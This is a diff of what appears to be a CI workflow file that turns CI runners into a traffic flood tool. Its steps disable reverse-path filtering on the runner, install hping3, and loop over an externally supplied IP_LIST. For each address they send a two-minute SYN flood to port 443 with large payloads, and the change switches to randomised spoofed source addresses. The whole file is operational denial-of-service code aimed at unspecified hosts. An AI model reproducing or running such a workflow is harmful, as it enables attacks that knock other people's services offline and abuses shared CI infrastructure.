@@ -56,18 +56,21 @@ jobs:
 
       - name: Check CPU Info
         run: |
-          # lscpu
+          lscpu
           # cat /proc/cpuinfo | grep "^processor" | wc -l
           # nproc
-          ip link show eth0
-          sudo ip link set eth0 txqueuelen 10000
+          # ip link show eth0
+          # sudo ip link set eth0 txqueuelen 10000
           # sysctl net.core.wmem_max
           # cat /proc/sys/net/core/wmem_max
           # sudo sysctl -w net.core.wmem_max=16777216
 
       - name: Step 1
         run: |
-          ip link show eth0
+          sudo sysctl -w net.ipv4.conf.all.rp_filter=0
+          sudo sysctl -w net.ipv4.conf.default.rp_filter=0
+          sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0
+
           yarn
 
           sudo apt install hping3 -q
@@ -84,13 +87,16 @@ jobs:
 
       - name: Step 2
         run: |
+          cat /proc/sys/net/ipv4/conf/all/rp_filter
+
           echo IP_LIST=$IP_LIST
 
           IFS=' ' read -ra IP_LIST <<< "$IP_LIST"
           for IP in "${IP_LIST[@]}"; do
             echo $IP
             echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-            sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+            # sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+            sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 --rand-source $IP || true
           done
           
           # for i in {1..4}; do
